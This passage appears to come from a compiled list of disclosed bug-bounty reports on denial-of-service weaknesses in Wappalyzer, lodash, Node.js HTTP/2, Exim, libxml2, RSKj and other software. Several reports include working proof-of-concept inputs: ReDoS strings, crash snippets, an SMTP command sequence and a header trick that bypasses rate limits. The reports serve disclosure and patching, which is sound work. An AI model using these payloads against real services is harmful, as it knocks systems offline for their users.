Additionally, if there are sensitive variables and attributes in a particular application, these can be controlled via the prototype.

---

### [[wappalyzer] ReDoS allows an attacker to completely break Wappalyzer](https://hackerone.com/reports/888030)

- **Report ID:** `888030`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @vrechson
- **Bounty:** - usd
- **Disclosed:** 2020-08-06T22:56:22.537Z
- **CVE(s):** -

**Vulnerability Information:**

Hello folks!

please note that I'm reporting two different problematic regexes.

**module name:** `Wappalyzer`
**version:** `6.0.2`
**npm page:** `https://www.npmjs.com/package/wappalyzer`

## Module Description

> Wappalyzer identifies technologies on websites.

## Module Stats

> Weekly downloads: `1,290`
> `88` open issues
> `16` open pull requests
> last publish: `3 days ago`

# Vulnerability

ReDoS  (Catastrophic backtracking)

## Vulnerability Description
> An attacker can make wappalyzer (all drivers, like browser extension and cli) stop working due to ReDoS in one of it's services regex . 

## Steps To Reproduce:

1. Create a web page with the following tag:
`<meta name="GENERATOR" content="IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:"/>`
2. Now open this page using wappalyzer extension in browser or it's cli
3. Wappalyzer will stop answering and it's CPU percentage will start to  increase to high levels

## Patch

 In order to test this issue, you can see that the problem resides in this line `https://github.com/AliasIO/wappalyzer/blob/master/src/apps.json#L13207` of wappalyzer application. When this regex test the input shown, it takes process the application indefinitely, making it stop working. Running it in browser extension completely crash the extension in all tabs, and in cli/node version the execution takes forever.

To patch this issue, the current regex must be changed to a more restrict one in this piece: `([0-9.]{2,})+`

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OS: Archlinux -  Linux 5.6.13-arch1-1 #1 SMP PREEMPT Thu, 14 May 2020 06:52:53 +0000 x86_64 GNU/Linux
- Node version: v12.16.3
- NPM version: 6.14.5
- Firefox: 76.0.1 (64-bit) - Mozilla Firefox for Arch Linux - archlinux - 1.0
- ReScuE was used to test for ReDoS (https://github.com/2bdenny/ReScue)

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

Hope I'm helping making node app more safe. thank you!

## Impact

An attacker can make wappalyzer stop working in it's pages, or pages in which he has injection and make user CPU starts to throttle

---

### [[is-my-json-valid] ReDoS via 'style' format](https://hackerone.com/reports/909757)

- **Report ID:** `909757`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2020-07-31T17:13:38.920Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a ReDoS in `is-my-json-valid`
It allows cause a denial of service if schema uses the built-in `style` format.

# Module

**module name:** `is-my-json-valid`
**version:** 2.20.1
**npm page:** `https://www.npmjs.com/package/is-my-json-valid`

## Module Description

> A JSONSchema validator that uses code generation to be extremely fast.

## Module Stats

1 250 253 weekly downloads

# Vulnerability

## Vulnerability Description

Classic ReDoS, polynomial time.

Note that https://www.npmjs.com/package/safe-regex is not free from false positives/negatives (as noted in its Readme) and does not catch this and other polynomial regexps (e.g. `/a*a*b/`).

## Steps To Reproduce:

```js
const imjv = require('is-my-json-valid')
const validate = imjv({ maxLength: 100, format: 'style' })
console.log(validate(' '.repeat(1e4)))
```

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

DoS if schema uses the `style` format.

---

### [Malformed HTTP/2 SETTINGS frame leads to reachable assert](https://hackerone.com/reports/800140)

- **Report ID:** `800140`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @jzebor
- **Bounty:** 250 usd
- **Disclosed:** 2020-07-03T14:43:57.323Z
- **CVE(s):** -

**Vulnerability Information:**

I do not expect any form of cash bounty for this issue. If we have discovered a unique vulnerability I only ask that Jordan Zebor and Adam Cabrey of F5 Networks be crediting with finding the issue.

**Summary:** A reachable assert in the NodeJS HTTP/2 implementation can result in a denial of service. 

**Description:** Attackers can send a series of malformed HTTP/2 SETTINGS frames to reach an assertion in code, causing the node process to exit with SIGABRT. This has been observed in v13.8.0 and v14.0.0-nightly20200213e23b12e130.

## Steps To Reproduce:
1) Create an example HTTP/2 server. I used the example code from here https://nodejs.org/api/http2.html#http2_http2_createsecureserver_options_onrequesthandler

2) Create an example client to send the attached cases in a loop. In this case, I used an internal fuzz testing tool that I unfortunately cannot share but I can attach the test cases which I sent. We discovered that by sending a malformed SETTINGS frame over and over (roughly 25 in a row) the node process will SIGABRT. 

3) Observe node process crash after series of requests are sent. I can consistently trigger this issue in 13.8.0 and 14.0.0. I will provide a stack trace, stack trace when run under valgrind, and the test case I used to reproduce the issue. If the core file is needed I can provide that as well.

I believe this is where the assertion is triggered.
https://github.com/nodejs/node/blob/f3682102dca1d24959e93de918fbb583f19ee688/src/node_http2.cc#L1521

## Impact: A reachable assert which leads to SIGBART of the entire node process. It's a denial of service issue.

## Supporting Material/References:
Notice with the attached examples are prefixed with the order in which they were sent. If you already know how to do all the connection preface setup then simply send the settings anomaly frame on a new connection over and over again. A visual representation of the settings frame which causes the issue can be seen in "SETTINGS_FRAME_DETAILS.png".

## Impact

A reachable assert which leads to SIGBART of the entire node process. It's a denial of service issue that an unauthenticated attacker can easily achieve. The CVSS calculator on this portal seems to be classifying the issue as "Critical", which I don't agree with. I believe this to be a "High" severity issue with this CVSS score - https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

---

### [disable test send feature if user's email address isn't verified](https://hackerone.com/reports/906226)

- **Report ID:** `906226`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Courier
- **Reporter:** @vaalici
- **Bounty:** - usd
- **Disclosed:** 2020-06-30T00:28:18.131Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There is no mechanism to limit the request in places while send the preview email

## Steps To Reproduce:
There is a weak account registration process, which allow user to register and login without any email confirmation.
L'say say for example that i'm the user A that want to send a phishing email or perform DOS against a targeted user

  1. Registration process by using the victim email address
  2. Craft the email example 
  3. Proced with the sent to me functionality to try the email send
  4. Intercept the request with a Proxy (Burp)
  5. Resend the request any times you want 

## Supporting Material/References:

CWE-400: Uncontrolled Resource Consumption
https://cwe.mitre.org/data/definitions/400.html

Below i have attached the evidence for the POC

## Impact

The most common result of resource exhaustion is denial of service.

---

### [[wappalyzer] ReDoS allows an attacker to completely break Wappalyzer](https://hackerone.com/reports/888021)

- **Report ID:** `888021`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @vrechson
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T18:01:28.187Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report [VULNERABILITY] in [MODULE]
It allows [DESCRIBE THE IMPACT OF THE VULNERABILITY - E.G READ ARBITRARY FILES, READ DATA FROM DATABASE ETC]

# Module

**module name:** `Wappalyzer`
**version:** 6.0.2
**npm page:** `https://www.npmjs.com/package/wappalyzer`

## Module Description

> Wappalyzer identifies technologies on websites.

## Module Stats

> Weekly downloads: 1,290
> 88 issues
> 16 pull requests
> last publish: 3 days ago

# Vulnerability

ReDoS  (Catastrophic backtracking)

## Vulnerability Description
> An attacker can make wappalyzer (all drivers, like browser extension and cli) stop working due to ReDoS in one of it's services regex . 

## Steps To Reproduce:

1. Create a web page with the following tag:
`<script src='//c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..jskhtlcnipmos.cdnjs.cdnjs.dnjs.cdnjs.cloudflar.jsjs.cloudf'></script>`
2. Now open this page using wappalyzer extension in browser or it's cli
3. Wappalyzer will stop answering and it's CPU percentage will start to  increase to high levels

## Patch

 In order to test this issue, you can see that the problem resides in this line https://github.com/AliasIO/wappalyzer/blob/master/src/apps.json#L11644 of wappalyzer application. When this regex test the input shown, it takes process the application indefinitely, making it stop working. Running it in browser extension completely crash the extension in all tabs, and in cli/node version the execution takes forever.

To patch this issue, the current regex must be changed to a more restrict one in this piece: `(?:[^\\/]+\\.)*`

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OS: Archlinux -  Linux 5.6.13-arch1-1 #1 SMP PREEMPT Thu, 14 May 2020 06:52:53 +0000 x86_64 GNU/Linux
- Node version: v12.16.3
- NPM version: 6.14.5
- Firefox: 76.0.1 (64-bit) - Mozilla Firefox for Arch Linux - archlinux - 1.0
- ReScuE was used to test for ReDoS (https://github.com/2bdenny/ReScue)

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can make wappalyzer stop working in it's pages, or pages in which he has injection and make user CPU starts to throttle

---

### [Prototype pollution in multipart parsing](https://hackerone.com/reports/804772)

- **Report ID:** `804772`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @mcollina
- **Bounty:** - usd
- **Disclosed:** 2020-02-28T10:55:15.010Z
- **CVE(s):** CVE-2020-8136

**Vulnerability Information:**

I would like to report a prototype pollution attack in fastify-multipart it allows to crash a remote server parsing multipart requests by sending a specially crafted request.

# Module

**module name:** fastify-multipart
**version:** all versions before < v1.0.5. v1.0.5 contains the fix. 
**npm page:** `https://www.npmjs.com/package/fastify-multipart`

## Module Description

[Fastify](https://www.fastify.io) plugin to parse the multipart content-type.

Under the hood it uses [busboy](http://npm.im/busboy).

## Module Stats

weekly downloads: 4900

# Vulnerability

## Vulnerability Description

Eran Hammer found this vulnerability for Hapi, he tested Fastify as well and found it vulnerable.
Here is the Hapi vulnerability report: https://www.npmjs.com/advisories/1479. 

## Steps To Reproduce:

> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.

## Patch

This was already released in https://github.com/fastify/fastify-multipart/pull/116 and version 1.0.5 issued.

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

I just need a CVE issued.

## Impact

It's a Denial of Service attack

---

### [Bypass password reset rate limit protection at moneybird.com/passwords](https://hackerone.com/reports/723974)

- **Report ID:** `723974`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Moneybird
- **Reporter:** @osama-hamad
- **Bounty:** - usd
- **Disclosed:** 2019-12-22T08:55:54.002Z
- **CVE(s):** -

**Summary (team):**

Attacker found a way to completely bypass our rate limit protection, allowing for other types of attacks. This involved changing the value of the X-Forwarded-For header. Attacker never got a 429 response from our servers when the value for each request is different.

**Summary (researcher):**

Injecting X-Forwarded-For : Header with random values leads to bypass rate limit protection 429 on the web application endpoints causing several attacks like brute force , email leakage , dos , email flooding ..etc

---

### [Lodash "difference" (possibly others) Function Denial of Service Through Unvalidated Input](https://hackerone.com/reports/670779)

- **Report ID:** `670779`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @spengietz
- **Bounty:** - usd
- **Disclosed:** 2019-12-04T19:49:06.258Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report a denial of service in Lodash.
It allows excessive usage of the NodeJS process's memory, leading to a "JavaScript heap out of memory" crash. The same vulnerability exists in the browser version of Lodash and causes Firefox's tab to crash and restart and causes Chrome's tab to completely freeze and become uncloseable (from my testing at least).

# Module

**module name:** Lodash
**version:** Only tested in 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

> Copy description from npm page

A modern JavaScript utility library delivering modularity, performance & extras.
The Lodash library exported as Node.js modules.

## Module Stats

> Replace stats below with numbers from npm’s module page:

24,853,923 downloads in the last week
I can't find where it lists the daily/monthly downloads

# Vulnerability

## Vulnerability Description

> Description about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.

The vulnerability was discovered while pentesting a web application for a client. The Lodash "difference" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947) uses the "baseDifference" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764) to perform what it needs to. "difference" is supposed to accept two arrays (`_.difference(array, [values])`) but it does not actually verify whether it is dealing with valid arrays before processing the data. This means a custom malicious Object can be supplied and the function will think it is an array, allowing excessive memory consumption that ends up in a crash of the Node.js process (or crash/freeze of the browser tab in Firefox/Chrome).

It was found to be exploitable in the clients application because they were passing user-supplied data into the "difference" function, which allowed me to crash their application with this vulnerability.

## Steps To Reproduce:

> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.

Benign example:
```
const _ = require('lodash')

user_supplied_array = [1, 2, 3]
values_to_compare_to = {'length': 5} // An object with the "length" property defined to an integer will be accepted as an array by the _.difference function

_.difference(values_to_compare_to, user_supplied_array) // This will output a new array of length 5 where each value is "undefined"
```

Because Lodash is essentially creating a new array of the length that we specify in "values_to_compare_to", we can provide a large value that will cause the Node.js process to crash before it can successfully create the array.

Will crash Node.js example:
```
const _ = require('lodash')

user_supplied_array = [1, 2, 3]
values_to_compare_to = {'length': 99999999999} // This could be any huge value

_.difference(values_to_compare_to, user_supplied_array) // The Node.js process will crash, saying that the JavaScript heap ran out of memory
```

When the Node.js process crashes, a stack trace similar to the following is output:
```
[5515:0x55aa82652700]    41959 ms: Mark-sweep 580.0 (585.7) -> 580.0 (585.7) MB, 201.8 / 0.0 ms  allocation failure GC in old space requested
[5515:0x55aa82652700]    42169 ms: Mark-sweep 580.0 (585.7) -> 579.9 (584.2) MB, 209.7 / 0.0 ms  last resort GC in old space requested
[5515:0x55aa82652700]    42372 ms: Mark-sweep 579.9 (584.2) -> 579.9 (584.2) MB, 203.2 / 0.0 ms  last resort GC in old space requested


<--- JS stacktrace --->

==== JS stack trace =========================================

Security context: 0x2eaefaca5729 <JSObject>
    1: baseDifference [/root/temp/tmp/node_modules/lodash/lodash.js:~2764] [pc=0x11aea9f0d272](this=0x28b6ba70c0f9 <JSGlobal Object>,array=0x3dd3a43ca4c9 <Object map = 0x1294fe65a571>,values=0x3dd3a43ca4a9 <JSArray[2]>,iteratee=0x3dd3a43822d1 <undefined>,comparator=0x3dd3a43822d1 <undefined>)
    2: arguments adaptor frame: 2->4
    3: /* anonymous */ [/root/temp/tmp/node_modules/lodash/lodash.j...

FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory
 1: node::Abort() [node]
 2: 0x55aa808c347e [node]
 3: v8::Utils::ReportOOMFailure(char const*, bool) [node]
 4: v8::internal::V8::FatalProcessOutOfMemory(char const*, bool) [node]
 5: v8::internal::Factory::NewUninitializedFixedArray(int) [node]
 6: 0x55aa80448b1d [node]
 7: v8::internal::Runtime_GrowArrayElements(int, v8::internal::Object**, v8::internal::Isolate*) [node]
 8: 0x11aea9d842fd
Aborted
```


## Patch

> If you're able to provide a patch with the fix please post it in this section

I don't know specifically, but it seems that proper verification that both inputs are arrays would fix this.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

Tested on two separate operating systems with the same end results.
Windows:
- Windows 10
- Node.js v8.9.4
- npm version 5.6.0
- Firefox 68.01 and Chrome 76.0.3809.100 when testing the browser version of Lodash

Linux:
- Kali Linux
- Node.js v9.0.0
- npm version 6.1.0
- Did not test in Firefox/Chrome on this operating system

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N, it said to report it here
- I opened an issue in the related repository: N, it said not to publicly disclose it until after

## Impact

An attacker could cause excessive resource consumption which could slow down the server for other users or they could cause an outright crash of the Node.js process, denying service to all users of the application.

---

### [Exim handles BDAT data incorrectly and leads to crash/hang](https://hackerone.com/reports/296994)

- **Report ID:** `296994`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @mehqq
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:47:13.399Z
- **CVE(s):** CVE-2017-16944, CVE-2017-16943

**Vulnerability Information:**

## Original article is [here](https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/)

# Incorrect BDAT data handling leads to DoS 

### Vulnerability Analysis
When receiving data with BDAT command, SMTP server should not consider a single dot `‘.’` in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:
```
220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:<meh@some.domain>
250 OK
RCPT TO:<meh@some.domain>
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
```
As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer `receive_getc` is not reset. If the next command is also a BDAT, `receive_getc` and `lwr_receive_getc` become the same and an infinite loop occurs inside `bdat_getc`. Program crashes due to stack exhaustion.
[smtp_in.c: 546 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546)
```
  if (chunking_data_left > 0)
    return lwr_receive_getc(chunking_data_left--);
```
This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.
```
# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:<meh@some.domain>
RCPT TO:<meh@some.domain>
BDAT 100
.
MAIL FROM:<meh@some.domain>
RCPT TO:<meh@some.domain>
BDAT 0 LAST
```
This makes attackers able to launch a resource based DoS attack and then force the whole server down.

## Impact

Make mail server process crash or hang. Attackers may launch a resource based DoS attack and then force the whole server down.

---

### [Potential infinite loop in gdImageCreateFromGifCtx!](https://hackerone.com/reports/305972)

- **Report ID:** `305972`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @orange
- **Bounty:** 500 usd
- **Disclosed:** 2019-11-12T09:18:47.646Z
- **CVE(s):** CVE-2018-5711

**Vulnerability Information:**

## Description
-----
It is easy to trigger in web application if the web use GD as its image library.
For example, It can be triggered if a website resize the user-uploaded GIF, and **ALL** PHP version are affected!
　
## Original bug report
-----
- https://bugs.php.net/bug.php?id=75571

　
## Note
-----
- CVE-2018-5711 assigned

　
Thanks :)

## Impact

A malicious GIF can trigger an infinite loop and lead to exhausted the server resource!

---

### [rpcbind "rpcbomb" CVE-2017-8779, CVE-2017-8804](https://hackerone.com/reports/235016)

- **Report ID:** `235016`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @guido
- **Bounty:** - usd
- **Disclosed:** 2019-10-14T00:24:47.261Z
- **CVE(s):** CVE-2017-8779, CVE-2017-8804

**Vulnerability Information:**

Description: this allowed an attacker to easily disrupt a remote system through excessive memory consumption.

Writeup: https://guidovranken.wordpress.com/2017/05/03/rpcbomb-remote-rpcbind-denial-of-service-patches/
Demonstration video: https://www.youtube.com/watch?v=b38H3oEgrQw (this video shows that the attack doesn't necessarily just crashes the rpcbind process, but that the entire system can slow down severely because it has to resort to swap memory, even if overcommit is enabled. This implies scope=changed in the CVSS. But I filled out unchanged to be consistent with the official assessment)
CVSS score: https://nvd.nist.gov/vuln/detail/CVE-2017-8779

rpcbind/libtirpc: CVE-2017-8779 http://git.linux-nfs.org/?p=steved/libtirpc.git;a=commit;h=dd9c7cf4f8f375c6d641b760d124650c418c2ce3 (patches by me)
GLIBC: CVE-2017-8804 https://sourceware.org/bugzilla/show_bug.cgi?id=21461

---

### [Denial of service in libxml2, using malicious lzma file to consume available system memory](https://hackerone.com/reports/270059)

- **Report ID:** `270059`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T17:40:10.289Z
- **CVE(s):** -

**Vulnerability Information:**

[Reported to the libxml2 devs on 23 August 2017](https://bugzilla.gnome.org/show_bug.cgi?id=786696)
[Patched on 7 September 2017](https://git.gnome.org/browse/libxml2/commit/?id=e2a9122b8dde53d320750451e9907a7dcb2ca8bb)

It was discovered through fuzzing that malicious LZMA compressed files could consume large amounts of memory when decompressed thus posing a DoS risk. I am unsure if a CVE will be assigned in this case.

```
od -tx1 ./test000
0000000 30 ff ff ff ff ff ff ff ff ff ff ff ff
0000015
```

```
./xmllint --valid test000
==31393==ERROR: AddressSanitizer failed to allocate 0x100002000 (4294975488) bytes of LargeMmapAllocator (error code: 12)
==31393==Process memory map follows:
        0x000000400000-0x000000fea000   /root/libxml2/xmllint
        0x0000011ea000-0x0000011eb000   /root/libxml2/xmllint
        0x0000011eb000-0x00000161e000   /root/libxml2/xmllint
        **SNIP**
        0x7f811e9e3000-0x7f811e9e4000
        0x7ffe02632000-0x7ffe02753000   [stack]
        0x7ffe027a9000-0x7ffe027ab000   [vvar]
        0x7ffe027ab000-0x7ffe027ad000   [vdso]
        0xffffffffff600000-0xffffffffff601000   [vsyscall]
==31393==End of process memory map.
==31393==AddressSanitizer CHECK failed: /build/llvm-toolchain-4.0-Ha24C1/llvm-toolchain-4.0-4.0/projects/compiler-rt/lib/sanitizer_common/sanitizer_common.cc:120 "((0 && "unable to mmap")) != (0)" (0x0, 0x0)
    #0 0x4da55f in __asan::AsanCheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/root/libxml2/xmllint+0x4da55f)
    #1 0x4f52d5 in __sanitizer::CheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/root/libxml2/xmllint+0x4f52d5)
    #2 0x4e4902 in __sanitizer::ReportMmapFailureAndDie(unsigned long, char const*, char const*, int, bool) (/root/libxml2/xmllint+0x4e4902)
    #3 0x4ee205 in __sanitizer::MmapOrDie(unsigned long, char const*, bool) (/root/libxml2/xmllint+0x4ee205)
    #4 0x4218e2 in __asan::asan_malloc(unsigned long, __sanitizer::BufferedStackTrace*) (/root/libxml2/xmllint+0x4218e2)
    #5 0x4d0544 in malloc (/root/libxml2/xmllint+0x4d0544)
    #6 0x7f811e38926e  (/lib/x86_64-linux-gnu/liblzma.so.5+0xf26e)
    #7 0x7f811e382fe0  (/lib/x86_64-linux-gnu/liblzma.so.5+0x8fe0)
    #8 0x7f811e383472  (/lib/x86_64-linux-gnu/liblzma.so.5+0x9472)
    #9 0x7f811e37ceb0 in lzma_code (/lib/x86_64-linux-gnu/liblzma.so.5+0x2eb0)
    #10 0xee7fb6 in xz_decomp /root/libxml2/xzlib.c:577:19
    #11 0xee6bd9 in xz_make /root/libxml2/xzlib.c:652:13
    #12 0xee4fbf in __libxml2_xzread /root/libxml2/xzlib.c:743:17
    #13 0x78121a in xmlXzfileRead /root/libxml2/xmlIO.c:1435:11
    #14 0x78b8bb in xmlParserInputBufferGrow /root/libxml2/xmlIO.c:3337:8
    #15 0x5571e7 in xmlParserInputGrow /root/libxml2/parserInternals.c:324:8
    #16 0x58669d in xmlGROW /root/libxml2/parser.c:2090:5
    #17 0x67d68d in xmlParseDocument /root/libxml2/parser.c:10590:5
    #18 0x6d4114 in xmlDoRead /root/libxml2/parser.c:15183:5
    #19 0x51b413 in parseAndPrintFile /root/libxml2/xmllint.c:2391:9
    #20 0x5125dc in main /root/libxml2/xmllint.c:3767:7
    #21 0x7f811d4893f0 in __libc_start_main /build/glibc-mXZSwJ/glibc-2.24/csu/../csu/libc-start.c:291
    #22 0x41abb9 in _start (/root/libxml2/xmllint+0x41abb9)
```

---

### [DoS through PeerExplorer](https://hackerone.com/reports/363636)

- **Report ID:** `363636`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Rootstock Labs
- **Reporter:** @z3t
- **Bounty:** 4000 usd
- **Disclosed:** 2019-09-18T13:16:28.759Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** The peer discovery implementation is vulnerable to a Denial of Service attack due to improper management of connections.

**Description:** The two main files of interest in detailing this vulnerability are [PeerExplorer.java](https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/co/rsk/net/discovery/PeerExplorer.java) and [NodeChallengeManager.java](https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/co/rsk/net/discovery/NodeChallengeManager.java). To explain the flow of execution I'll be mentioning two theoretical nodes: an attacker, "N1" and a target, "N2".

When N1 sends an initial "ping" message to N2, N2 will reply with a "pong" message and a subsequent ping message to continue the handshake. After this, when N1 replies with a pong message, N2 will attempt to add N1 to its structure holding established connections. The relevant code snippets from `PeerExplorer.java` are below:
```    
public void handlePong(String ip, PongPeerMessage message) {
	PeerDiscoveryRequest request = this.pendingPingRequests.get(message.getMessageId());

	if (request != null && request.validateMessageResponse(message)) {
		this.pendingPingRequests.remove(message.getMessageId());
		NodeChallenge challenge = this.challengeManager.removeChallenge(message.getMessageId());
		if (challenge == null) {
			this.addConnection(message, ip, message.getPort());
		}
	}
}
...
private void addConnection(PongPeerMessage message, String ip, int port) {
	Node senderNode = new Node(message.getNodeId().getID(), ip, port);
	if (!StringUtils.equals(senderNode.getHexId(), this.localNode.getHexId())) {
		OperationResult result = this.distanceTable.addNode(senderNode);

		if (result.isSuccess()) {
			NodeID senderId = senderNode.getId();
			this.establishedConnections.put(senderId, senderNode);
			logger.debug("New Peer found ip:[{}] port[{}]", ip, port);
		} else {
			this.challengeManager.startChallenge(result.getAffectedEntry().getNode(), senderNode, this);
		}
	}
}
```
The `addConnection` method first attempts to add N1 to the `NodeDistanceTable` - a structure designed to hold a limited number of nodes (by default, 4096). If this insertion fails due to the target `NodeDistanceTable` bucket already being full, the attempted connection is instead added to `NodeChallengeManager`. The relevant code snippets from `NodeChallengeManager.java` are below:
```
public NodeChallenge startChallenge(Node challengedNode, Node challenger, PeerExplorer explorer) {
	PingPeerMessage pingMessage = explorer.sendPing(challengedNode.getAddress(), 1, challengedNode);
	String messageId = pingMessage.getMessageId();
	NodeChallenge challenge = new NodeChallenge(challengedNode, challenger, messageId);
	activeChallenges.put(messageId, challenge);
	return challenge;
}

public NodeChallenge removeChallenge(String challengeId) {
	return activeChallenges.remove(challengeId);
}
```

Through the `startChallenge` method N2 will send N1 another ping message, adding a "challenge" to `activeChallenges` with that new ping message's `messageId`. The issue here is that **the entry is only ever removed from `activeChallenges` if N1 replies with a pong that has the same `messageId` as the new ping message** - as seen in `PeerExplorer.handlePong`. Thus, N1 is able to create an arbitrary number of entries in `activeChallenges` by never sending N2 a pong with the challenge ping's `messageId`.

It should be noted that there is a slight limitation as to how this could be exploited by a single host. The relevant code snippets from `PeerExplorer.java` are below:
```
public PingPeerMessage sendPing(InetSocketAddress nodeAddress, int attempt, Node node) {
	PingPeerMessage nodeMessage = checkPendingPeerToAddress(nodeAddress);

	if (nodeMessage != null) {
		return nodeMessage;
	}
	....
}
...
private PingPeerMessage checkPendingPeerToAddress(InetSocketAddress address) {
	for (PeerDiscoveryRequest req : this.pendingPingRequests.values()) {
		if (req.getAddress().equals(address)) {
			return (PingPeerMessage) req.getMessage();
		}
	}

	return null;
}

```
The `sendPing` method will only ever actually send a new ping to N1 if there are no pending pings to its `InetSocketAddress` (which is deemed equal if the host and port match) - as seen in `checkPendingPeerToAddress`. However, pending pings have a set expiry time (by default, 30 seconds) and those that have expired are cleared by `PeerExplorerCleaner` at a fixed rate (by default, every 60 seconds). So due to this limitation, with the default configuration settings a single host can only complete 65,535 handshakes (one per port) every minute - imposing a (perhaps unreachable) limit on the time it takes to exhaust the target node's memory. Though this can obviously be circumvented by using multiple hosts to attack a target node. 


Because most peer discovery functionality identifies nodes by their `NodeID` and not by host/port, it's trivial to send a flood of requests with unique `NodeID`s to fill `NodeDistanceTable` and subsequently make an unrestricted amount of in-memory insertions into `NodeChallengeManager.activeChallenges`. This is further aided by the fact that `NodeChallengeManager` is never purged, so the request flood does not have to occur within a short period of time. Memory exhaustion will eventually occur as the `NodeChallenge` objects begin taking up a significant amount of memory and are not eligible for garbage collection. This is expected to eventually disable node functionality as individual threads die when they throw `OutOfMemoryError`s, but in my testing it ended up crashing the whole JVM after reaching ~200,000 insertions.

## Steps To Reproduce:

I've attached a PoC program that interfaces with the RSKj library for the sake of simplicity. Due to the PoC program being somewhat inefficient and unreliable, I ended up accelerating the testing process by modifying my testing node's `NodeChallengeManager` to make 10 insertions per valid `startChallenge` call. If you're interested in running the PoC despite those issues, follow these steps:
  1. Download a copy of the RSKj code
  2. Move the PoC files into the `co.rsk.net.discovery` package (overwrite `PeerExplorer.java` with my modified version)
  3. Launch a node for testing - ensure peer discovery is enabled
  4. Compile and run the PoC from `PeerFlood` - arguments format: `<local_address> <target_address> <target_port> <num_threads>`
  5. Monitor testing node's logs and stability

If you're developing your own PoC, you need to simply flood a testing node with connections that use random `NodeID`s, completing a single ping<->pong handshake then immediately disconnecting.

## Mitigation
This could be mitigated by implementing expiring challenges that are cleared by `PeerExplorerCleaner`.

## Impact

An attacker could crash any RSKj node with peer discovery enabled (which it is by default).

---

### [Multiple HTTP/2 DOS Issues](https://hackerone.com/reports/589739)

- **Report ID:** `589739`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @jasnell
- **Bounty:** - usd
- **Disclosed:** 2019-08-16T23:40:09.482Z
- **CVE(s):** -

**Vulnerability Information:**

